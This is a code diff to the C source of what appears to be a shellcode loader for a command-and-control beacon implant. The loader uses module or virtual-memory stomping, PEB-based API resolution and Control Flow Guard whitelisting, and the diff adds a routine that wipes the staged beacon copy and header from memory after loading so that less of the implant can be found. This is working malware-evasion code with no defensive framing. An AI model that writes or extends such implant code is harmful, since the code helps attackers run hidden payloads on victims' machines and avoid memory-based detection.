@@ -9,8 +9,7 @@
  *   2. Calculated Base.Length = StRipEnd() - StRipStart()  (loader size)
  *   3. Resolved ntdll!RtlAllocateHeap + kernel32 TLS APIs
  *   4. Stored INSTANCE in TLS (consecutive-slot egghunter)
- *   5. Zeroed out the StRipEnd code (anti-fingerprint)
- *   6. Transferred control here via Main()
+ *   5. Transferred control here via Main()
  *
  * Technique selection is compile-time via preprocessor defines:
  *
@@ -56,6 +55,32 @@ FUNC PVOID NaxAllocExec(
 
 #endif /* NAX_STOMP_VIRTUAL */
 
+/* ========= [ staged-copy wipe ] ========= */
+
+/* Zero the pack tail (header + beacon source copy + pdata/xdata) inside the
+ * blob region the bootstrap executed from.  Padded packs place the header at
+ * the next page boundary after the loader image, so flipping only the tail
+ * RW never VirtualProtects a page holding loader code.  Main guards the call
+ * on the padded-pack probe; legacy packs skip the wipe (their header shares
+ * a page with loader code - a VP there would NX it mid-execution).  A failed
+ * VP pair simply persists the copy; boot continues either way. */
+static VOID NaxWipeStaged(
+    _In_ PVOID Tail,
+    _In_ ULONG Total ) {
+    STARDUST_INSTANCE
+
+    PVOID  base = C_PTR( U_PTR( Tail ) & ~( LDR_PAGE_SIZE - 1 ) );
+    SIZE_T size = ALIGN_UP( U_PTR( Tail ) - U_PTR( base ) + Total, LDR_PAGE_SIZE );
+    ULONG  oldp = 0;
+
+    if ( !NT_SUCCESS( API( NtProtectVirtualMemory )( NtCurrentProcess(), &base, &size, PAGE_READWRITE, &oldp ) ) )
+        return;
+
+    MmZero( Tail, Total );
+
+    API( NtProtectVirtualMemory )( NtCurrentProcess(), &base, &size, oldp, &oldp );
+}
+
 /* ========= [ entry - resolve APIs, parse header, dispatch ] ========= */
 
 FUNC VOID Main(
@@ -65,6 +90,7 @@ FUNC VOID Main(
     PVOID  hdr       = { 0 };
     PVOID  beacon_src = { 0 };
     PVOID  entry      = { 0 };
+    BOOL   padded    = FALSE;
 
     /* ========= [ resolve modules ] ========= */
     if ( !( MOD( Kernel32 ) = LdrModulePeb( H_MODULE_KERNEL32 ) ) )
@@ -98,6 +124,15 @@ FUNC VOID Main(
 
     /* ========= [ parse NaxHeader ] ========= */
     hdr = LOADER_END();
+
+    /* Packed builds pad the loader to the next page boundary and place the
+     * header there; legacy packs keep it right behind the loader image.
+     * Probe aligned first, fall back otherwise - the probe also gates the
+     * staged-copy wipe below. */
+    if ( HDR_U32( C_PTR( ALIGN_UP( U_PTR( hdr ), LDR_PAGE_SIZE ) ), NAX_HDR_OFF_MAGIC ) == NAX_HDR_MAGIC ) {
+        hdr    = C_PTR( ALIGN_UP( U_PTR( hdr ), LDR_PAGE_SIZE ) );
+        padded = TRUE;
+    }
 
     ULONG magic       = HDR_U32( hdr, NAX_HDR_OFF_MAGIC );
     ULONG beacon_size = HDR_U32( hdr, NAX_HDR_OFF_BEACON_SZ );
@@ -144,6 +179,15 @@ FUNC VOID Main(
 
     if ( !entry )
         return;
+
+    /* ========= [ wipe staged copy ] ========= */
+#if NAX_STOMP_MODE == NAX_STOMP_MODULE
+    if ( padded )
+        NaxWipeStaged( hdr, NAX_HDR_SIZE + beacon_size + pdata_size + xdata_size );
+#elif NAX_STOMP_MODE == NAX_STOMP_VIRTUAL
+    if ( padded )
+        NaxWipeStaged( hdr, NAX_HDR_SIZE + beacon_size );
+#endif
 
     /* ========= [ CFG: whitelist beacon entry in stomped DLL ] ========= */
 #if NAX_STOMP_MODE == NAX_STOMP_MODULE
